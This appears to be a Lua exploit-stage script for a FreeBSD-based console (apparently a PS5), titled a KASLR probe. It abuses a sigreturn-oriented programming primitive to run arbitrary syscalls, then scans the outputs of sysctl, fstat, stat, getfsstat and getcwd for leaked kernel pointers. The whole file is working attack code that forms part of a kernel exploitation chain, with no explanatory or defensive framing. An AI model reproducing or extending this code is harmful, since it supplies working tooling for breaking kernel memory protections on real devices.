-- CRASH_CLASS: LOW
-- PROBE 169a: KASLR via stat/fstat inode leaks + native timing
--
-- Strategy:
-- A) Read kern.proc.sigtramp / hw.pagesize values explicitly
-- B) fstat() on open fds to check for high inode numbers
-- C) stat() on /dev nodes for device number / inode leaks
-- D) Check if native.fcall API exists for tight timing
-- E) Try fstatat() for directory entries (since getdirentries blocked)
-- F) getfsstat() to enumerate mounted filesystems

print("=== PROBE 169a: KASLR STAT/TIMING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x800000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function pack4(b0, b1, b2, b3)
    return b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
end

-- [A] Read sysctl values explicitly
print("--- [A] SYSCTL VALUES ---")
local MIB = 0x50000
local SOUT = 0x51000
local SLEN = 0x50F00

local function sysctl_val(name, mibs, mlen)
    for off = 0, 0x1F, 4 do wd(gpu + MIB + off, 0) end
    for i, v in ipairs(mibs) do wd(gpu + MIB + (i-1)*4, v) end
    for off = 0, 0xFF, 4 do wd(gpu + SOUT + off, 0) end
    wd(gpu + SLEN, 0x100)
    wd(gpu + SLEN + 4, 0)
    local rv = srop(202, ga(MIB), uint64(mlen), ga(SOUT), ga(SLEN), uint64(0), uint64(0))
    local rvv = rv and to_num(rv) or -999
    local alen = rd(gpu + SLEN)
    if rvv == 0 and alen > 0 then
        print(name .. ": len=" .. alen)
        for off = 0, math.min(alen - 4, 0x30), 4 do
            local v = rd(gpu + SOUT + off)
            print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
        for off = 0, math.min(alen - 8, 0x30), 8 do
            local val = rq(gpu + SOUT + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KPTR +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
        return alen
    else
        print(name .. ": rv=" .. rvv)
        return 0
    end
end

sysctl_val("kern.proc.sigtramp", {1, 14, 41, pid}, 4)
sysctl_val("hw.pagesize", {6, 7}, 2)
sysctl_val("hw.ncpu", {6, 3}, 2)
sysctl_val("kern.boottime", {1, 21}, 2)
sysctl_val("kern.proc.groups", {1, 14, 36, pid}, 4)

-- Try sigtramp with -1 (all processes)
sysctl_val("kern.proc.sigtramp(-1)", {1, 14, 41, -1}, 4)

-- [B] fstat() on known fds
print("")
print("--- [B] FSTAT ON FDS ---")
-- struct stat on FreeBSD amd64 is 120 bytes
-- Key fields: st_dev(+0x00, 8), st_ino(+0x08, 8), st_nlink(+0x10, 8)
-- st_rdev(+0x58, 8)
local STAT = 0x60000

-- Try fstat via SROP on stdin (fd 0), stdout (fd 1), stderr (fd 2)
for _, fd in ipairs({0, 1, 2}) do
    for off = 0, 0x7F, 4 do wd(gpu + STAT + off, 0) end
    local rv = srop(189, uint64(fd), ga(STAT))
    local rvv = rv and to_num(rv) or -999
    if rvv == 0 then
        local dev_lo = rd(gpu + STAT)
        local dev_hi = rd(gpu + STAT + 4)
        local ino_lo = rd(gpu + STAT + 8)
        local ino_hi = rd(gpu + STAT + 12)
        local nlink = rd(gpu + STAT + 0x10)
        print("fd " .. fd .. ": dev=0x" .. string.format("%X%08X", dev_hi, dev_lo) ..
            " ino=0x" .. string.format("%X%08X", ino_hi, ino_lo) ..
            " nlink=" .. nlink)
        -- Check for kernel pointers in full struct
        for off = 0, 0x74, 8 do
            local val = rq(gpu + STAT + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KPTR +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    else
        print("fd " .. fd .. ": fstat=" .. rvv)
    end
end

-- fstat on a socket
local sockfd = srop(97, uint64(2), uint64(1), uint64(0))
local sockfdv = sockfd and to_num(sockfd) or -1
if sockfdv >= 0 then
    for off = 0, 0x7F, 4 do wd(gpu + STAT + off, 0) end
    local rv = srop(189, uint64(sockfdv), ga(STAT))
    local rvv = rv and to_num(rv) or -999
    if rvv == 0 then
        print("socket: dev=0x" .. string.format("%X%08X",
            rd(gpu + STAT + 4), rd(gpu + STAT)) ..
            " ino=0x" .. string.format("%X%08X",
            rd(gpu + STAT + 12), rd(gpu + STAT + 8)))
        for off = 0, 0x74, 8 do
            local val = rq(gpu + STAT + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KPTR +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    else
        print("socket: fstat=" .. rvv)
    end
    srop(6, uint64(sockfdv))
end

-- fstat on a pipe
local pipefd = srop(42)
local pipefdv = pipefd and to_num(pipefd) or -1
if pipefdv >= 0 then
    for off = 0, 0x7F, 4 do wd(gpu + STAT + off, 0) end
    local rv = srop(189, uint64(pipefdv), ga(STAT))
    if rv and to_num(rv) == 0 then
        print("pipe: dev=0x" .. string.format("%X%08X",
            rd(gpu + STAT + 4), rd(gpu + STAT)) ..
            " ino=0x" .. string.format("%X%08X",
            rd(gpu + STAT + 12), rd(gpu + STAT + 8)))
        for off = 0, 0x74, 8 do
            local val = rq(gpu + STAT + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KPTR +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    else
        print("pipe: fstat=" .. (rv and to_num(rv) or -999))
    end
    srop(6, uint64(pipefdv))
    srop(6, uint64(pipefdv + 1))
end

-- [C] stat() on /dev nodes
print("")
print("--- [C] STAT /DEV NODES ---")
local devs = {"gc", "dce", "rng", "ajm", "camera", "notification0"}

for _, devname in ipairs(devs) do
    local PATH = 0x70000
    local fullpath = "/dev/" .. devname
    for off = 0, 0x1F, 4 do wd(gpu + PATH + off, 0) end
    for i = 1, #fullpath do
        local byte_off = i - 1
        local dword_off = byte_off - (byte_off % 4)
        local shift = (byte_off % 4) * 8
        local cur = rd(gpu + PATH + dword_off)
        local b = string.byte(fullpath, i)
        cur = cur - (math.floor(cur / (256 ^ (byte_off % 4))) % 256) * (256 ^ (byte_off % 4))
        cur = cur + b * (256 ^ (byte_off % 4))
        wd(gpu + PATH + dword_off, cur)
    end

    for off = 0, 0x7F, 4 do wd(gpu + STAT + off, 0) end
    -- stat is syscall 188 on FreeBSD
    local rv = srop(188, ga(PATH), ga(STAT))
    local rvv = rv and to_num(rv) or -999
    if rvv == 0 then
        local ino_lo = rd(gpu + STAT + 8)
        local ino_hi = rd(gpu + STAT + 12)
        local rdev_lo = rd(gpu + STAT + 0x58)
        local rdev_hi = rd(gpu + STAT + 0x5C)
        print(devname .. ": ino=0x" .. string.format("%X%08X", ino_hi, ino_lo) ..
            " rdev=0x" .. string.format("%X%08X", rdev_hi, rdev_lo))
        for off = 0, 0x74, 8 do
            local val = rq(gpu + STAT + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KPTR +" .. string.format("%02X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    else
        print(devname .. ": stat=" .. rvv)
    end
end

-- [D] Check native API
print("")
print("--- [D] NATIVE API CHECK ---")
local has_native = type(native) == "table"
print("native table exists: " .. tostring(has_native))
if has_native then
    for k, v in pairs(native) do
        print("  native." .. tostring(k) .. " = " .. type(v))
    end

    -- Try fcall for tight timing
    if native.fcall_with_rax then
        print("fcall_with_rax available!")
        -- Test: getpid should return our pid
        local ok, rv = pcall(function()
            return native.fcall_with_rax(20)
        end)
        print("fcall getpid=" .. tostring(rv) .. " ok=" .. tostring(ok))
    end
end

-- [E] getfsstat (sys 395 on FreeBSD, 557 on PS5?)
print("")
print("--- [E] GETFSSTAT ---")
-- Try getfsstat(buf, bufsize, MNT_NOWAIT=2) — sys 395
local FS_OFF = 0x80000
for off = 0, 0x3FFF, 4 do wd(gpu + FS_OFF + off, 0) end
-- struct statfs is 0x230 (560 bytes) on FreeBSD amd64
local rv = srop(395, ga(FS_OFF), uint64(0x4000), uint64(2))
local rvv = rv and to_num(rv) or -999
print("getfsstat=" .. rvv)

if rvv > 0 then
    print("mounted filesystems: " .. rvv)
    -- Each statfs is 0x230 bytes
    for i = 0, math.min(rvv - 1, 3) do
        local base = FS_OFF + i * 0x230
        -- +0x00: f_version (uint32)
        -- +0x04: f_type (uint32)
        -- +0x10: f_bsize
        -- +0x88: f_fstypename[16]
        -- +0x98: f_mntfromname[88]
        -- +0xF0: f_mntonname[88]
        local ver = rd(gpu + base)
        local ftype = rd(gpu + base + 4)

        -- Read type name
        local tname = ""
        for j = 0, 15 do
            local b = math.floor(rd(gpu + base + 0x88 + (j - j%4)) /
                (256 ^ (j % 4))) % 256
            if b == 0 then break end
            tname = tname .. string.char(b)
        end

        -- Read mount point
        local mnt = ""
        for j = 0, 31 do
            local b = math.floor(rd(gpu + base + 0xF0 + (j - j%4)) /
                (256 ^ (j % 4))) % 256
            if b == 0 then break end
            mnt = mnt .. string.char(b)
        end

        print("  fs[" .. i .. "]: type=" .. tname .. " mount=" .. mnt)

        -- Scan for kernel pointers
        for off = 0, 0x22C, 8 do
            local val = rq(gpu + base + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("    *** KPTR +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    end
end

-- [F] Try __getcwd (sys 326)
print("")
print("--- [F] GETCWD ---")
local CWD_OFF = 0xC0000
for off = 0, 0xFF, 4 do wd(gpu + CWD_OFF + off, 0) end
rv = srop(326, ga(CWD_OFF), uint64(0x100))
rvv = rv and to_num(rv) or -999
print("getcwd=" .. rvv)
if rvv == 0 then
    local cwd = ""
    for i = 0, 63 do
        local b = math.floor(rd(gpu + CWD_OFF + (i - i%4)) /
            (256 ^ (i % 4))) % 256
        if b == 0 then break end
        cwd = cwd .. string.char(b)
    end
    print("cwd=" .. cwd)
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
